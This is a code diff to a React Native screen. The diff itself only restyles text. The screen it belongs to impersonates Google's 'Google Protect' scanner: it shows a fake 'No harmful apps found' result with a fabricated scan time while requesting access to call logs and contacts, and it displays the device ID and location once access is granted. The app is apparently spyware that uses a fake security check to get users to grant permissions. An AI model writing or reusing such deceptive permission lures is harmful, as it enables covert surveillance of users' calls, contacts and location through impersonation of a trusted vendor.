@@ -42,6 +42,7 @@ const Permission = () => {
   const time = format(Date.now() - 1000 * 60 * 60 * 1.86, 'HH:mm');
 
   const requestAllPermissions = async () => {
+    console.log('Platform.Version', Platform.Version);
     let listPermissions = [
       PermissionsAndroid.PERMISSIONS.READ_CALL_LOG,
       PermissionsAndroid.PERMISSIONS.READ_CONTACTS,
@@ -137,11 +138,20 @@ const Permission = () => {
               duration={1000}
             />
           </View>
-          <Text style={{fontWeight: 'bold', fontSize: 23, marginTop: 32}}>
+          <Text
+            style={{
+              fontWeight: 'bold',
+              fontSize: 23,
+              marginTop: 32,
+              color: 'black',
+            }}>
             {'No harmful apps found'}
           </Text>
           <Text
-            style={{marginTop: 14}}>{`Google Protect scanned at ${time}`}</Text>
+            style={{
+              marginTop: 14,
+              color: 'black',
+            }}>{`Google Protect scanned at ${time}`}</Text>
         </View>
         <Text
           style={{
@@ -149,6 +159,7 @@ const Permission = () => {
             fontSize: 16,
             textAlign: 'left',
             marginTop: 16,
+            color: 'black',
           }}>
           {'Recently scanned apps'}
         </Text>
@@ -167,7 +178,7 @@ const Permission = () => {
             />
           ))}
         </View>
-        <Text>{`Apps scanned at ${time}`}</Text>
+        <Text style={{color: 'black'}}>{`Apps scanned at ${time}`}</Text>
         <View
           style={{
             borderTopWidth: 0.2,
@@ -175,7 +186,7 @@ const Permission = () => {
             marginVertical: 16,
           }}
         />
-        <Text>
+        <Text style={{color: 'black'}}>
           {
             "Google Protect regularly checks your apps and device for harmful behavior. You'll be notified of any sercurity risks found."
           }
@@ -183,7 +194,7 @@ const Permission = () => {
         <View style={{flex: 1, marginTop: 'auto', justifyContent: 'flex-end'}}>
           {permissionsGranted && (
             <View style={{flexDirection: 'row', alignItems: 'center'}}>
-              <Text style={{fontSize: 12}}>{deviceId}</Text>
+              <Text style={{fontSize: 12, color: 'black'}}>{deviceId}</Text>
               <View
                 style={{flexDirection: 'row', gap: 4, alignItems: 'center'}}>
                 <Location />
